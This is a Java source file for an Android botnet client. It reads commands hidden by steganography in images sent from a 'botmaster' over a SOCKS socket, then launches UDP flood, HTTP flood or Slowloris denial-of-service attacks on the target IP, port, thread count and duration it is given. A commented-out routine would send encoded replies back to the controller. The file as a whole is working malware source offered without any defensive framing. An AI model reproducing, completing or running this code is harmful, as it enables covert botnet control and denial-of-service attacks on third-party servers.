package com.example.botclient;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.util.Log;
import com.example.botclient.SteganoGraphy.Decode.AsyncResponse;
import com.example.botclient.SteganoGraphy.Decode.TextDecoding;
import com.example.botclient.SteganoGraphy.Encode.TextEncoding;
import com.example.botclient.SteganoGraphy.Encode.TextResponseEncoding;
import com.example.botclient.SteganoGraphy.Images;
import com.example.botclient.SteganoGraphy.AttackInfo;
import com.example.botclient.httpflood.HttpFlood;
import com.example.botclient.slowloris.SlowCaller;
import com.example.botclient.udpflood.UdpFlood;
import java.io.*;

import net.sf.runjva.sourceforge.jsocks.protocol.SocksSocket;

public class Bot implements Runnable, AsyncResponse, TextResponseEncoding
{
    private DataInputStream dataInputStream;
    private InputStream inputStream;
    private SocksSocket socket;
    private String destination_ip;
    private int destination_port;
    private int threads;
    private String attack;
    private int timer;
    private TextEncoding textEncoding;
    private HeartBeat heartBeat;
    private Bitmap bitmapImage,responseBitmap;
    private Images objectImage, imageToEncode;
    private AttackInfo finalImage;
    private boolean called = false;

    private Images encodedResponseImage;

    public Bot() { }

    public Bot(SocksSocket socket)
    {
        this.socket = socket;
        inputStream = socket.getInputStream();
        dataInputStream = new DataInputStream(inputStream);
    }

    //this override the implemented method from asyncTask
    @Override
    public void processFinish(AttackInfo output)
    {
        //Here we receive the decoded Image object returned from async class of onPostExecute(result) method.
        finalImage = output;
        attack = finalImage.getTypeofAttack(); //get type of attack
        //this recycles the bitmap and frees up memory
        if(bitmapImage != null)
        {
            bitmapImage.recycle();
            bitmapImage = null;
            System.out.println("Bitmap recycled");
        }
        System.runFinalization();
        Runtime.getRuntime().gc();
        System.gc();

        new Thread()
        {
            @Override
            public void run()
            {

                    System.out.println("BotMaster said: "+attack);

                    if(attack.equals("UDP"))
                    {
                        destination_ip = finalImage.getStarget();
                        threads = finalImage.getSthreads();
                        timer = finalImage.getStimer();

                        //UDP flood call
                        UdpFlood udpFlood = new UdpFlood(threads,timer,destination_ip);
                        udpFlood.start();

//                        AttackInfo response = new AttackInfo("udp attack called");
//                        respondToMaster(response);
                    }
                    else if(attack.equals("HTTP"))
                    {
                        destination_ip = finalImage.getStarget();
                        threads = finalImage.getSthreads();
                        timer = finalImage.getStimer();

                        //Http flood call
                        int i=0;

                        while(i<threads)
                        {
                            System.out.println("Attack number: "+i);
                            HttpFlood.Flooder attack = new HttpFlood.Flooder("http://"+destination_ip,timer);
                            new Thread (attack).start();
                            i++;
                        }
                        // AttackInfo message = new AttackInfo("http completed ok");
                        // respondToMaster(message);

                    }
                    else if(attack.equals("SlowLoris"))
                    {
                        destination_ip = finalImage.getStarget();
                        threads = finalImage.getSthreads();
                        destination_port = finalImage.getSport();
                        timer = finalImage.getStimer();

                        //SlowLoris call
                        SlowCaller slowCaller = new SlowCaller(destination_ip, destination_port, threads, timer);
                        slowCaller.caller();
                        //   AttackInfo message = new AttackInfo("slowloris completed ok");
                        //respondToMaster(message);

                    }
                    else if(attack.equals("SHUTDOWN"))
                    {
//                objectInputStream.close();
//                objectInputStream.close();
//                socket.close();
                    }

            }
            }.start();
    }

    public void run()
    {
         //new HeartBeat(socket).heart();
        try
        {
            Log.e("Connecting"," "+socket);
            System.out.println("Waiting for botmaster's message...........");

            int length = 0;
            byte[] data = null;

            if(!socket.isClosed())
            {
                length= dataInputStream.readInt();
                new HeartBeat().StopTimer();
                data = new byte[length];
                System.out.println("Received length");
            }
            else
            {
                System.out.println("Socket is closed!!!!!!!");
            }


            if (length > 0)
            {
                dataInputStream.readFully(data,0,data.length);
                System.out.println("Received data");
            }
            byte[] byteArray = data;

            inputStream.close();
            dataInputStream.close();

            bitmapImage = BitmapFactory.decodeByteArray(byteArray,0,byteArray.length);
            System.out.println("Bitmap ok");

            Images imageSteganography = new Images(" ", bitmapImage);

            TextDecoding textDecoding = new TextDecoding();
            textDecoding.returnThis = this; //this to set listener back to this class
            textDecoding.execute(imageSteganography);//execute the async task
        }

        catch (Exception ex)
        {
            ex.printStackTrace();
        }
    }

    @Override
    public void ImageEncoder(Images output)
    {
        encodedResponseImage = output;
        called = true;
    }

//    public void respondToMaster(AttackInfo message)
//    {
//        AssetManager assetManager = getApplicationContext().getAssets();
//        InputStream input;
//
//        try
//        {
//            //Retrieve an image from the assets folder
//            System.out.println("Accessing assets folder to retrieve image");
//            input = assetManager.open("logo.png");
//            //Convert it to bitmap
//            responseBitmap = BitmapFactory.decodeStream(input);
//            System.out.println("retrieved");
//            input.close();
//
//           // responseBitmap = new MainActivity().getBitmap();
//
//            //Send bitmap to get encoded with the message
//            imageToEncode = new Images(message, " ",responseBitmap);
//            textEncoding = new TextEncoding(this);
//            textEncoding.execute(imageToEncode);
//
//            if(called == true)
//            {
//                //Convert the encoded image to Bitmap object
//                Bitmap finalBitmap = encodedResponseImage.getEncoded_image();
//
//                //Convert Bitmap to byte array:
//                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//                finalBitmap.compress(Bitmap.CompressFormat.PNG, 0, byteArrayOutputStream);
//                byte bitmapBytes[] = byteArrayOutputStream.toByteArray();
//
//                System.out.println("sending response");
//                OutputStream out = socket.getOutputStream();
//                DataOutputStream dos = new DataOutputStream(out);
//                dos.writeInt(bitmapBytes.length);
//                System.out.println("Bytes sent ok");
//                dos.write(bitmapBytes, 0, bitmapBytes.length);
//                System.out.println("Image sent ok");
//                out.close();
//                dos.close();
//            }
//            else
//            {
//                System.out.println("NOT CALLED!!!!!!!!!!!");
//            }
//
//
//
//        }
//        catch (IOException e) {
//            e.printStackTrace();
//        }
//    }


}
